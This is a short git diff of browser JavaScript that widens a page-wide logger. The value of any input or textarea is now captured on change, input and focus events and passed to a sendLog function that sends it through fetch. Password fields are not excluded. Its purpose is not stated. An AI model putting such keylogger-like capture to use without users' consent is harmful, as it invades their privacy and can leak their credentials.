@@ -42,24 +42,27 @@ function sendLog(word) {
     }).catch(error => console.error('Error:', error));
 }
 
-document.addEventListener('click', () => {
-    if (currentWord.length > 0) {
-        sendLog(currentWord);
-        currentWord = '';
-    }
-    changeHandled = false;
-});
+// document.addEventListener('click', () => {
+//     if (currentWord.length > 0) {
+//         sendLog(currentWord);
+//         currentWord = '';
+//     }
+//     changeHandled = false;
+// });
 
-
-document.addEventListener('change', (event) => {
-    if(isKeydown){
+function handleChange(event) {
+    if (isKeydown) {
         isKeydown = false;
         return;
     }
     if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') {
         if (event.target.value.length > 0) {
-            currentWord=event.target.value;
-            changeHandled = true; 
+            currentWord = event.target.value;
+            changeHandled = true;
         }
     }
-});
+}
+
+document.addEventListener('change', handleChange);
+document.addEventListener('input', handleChange);
+document.addEventListener('focus', handleChange, true);
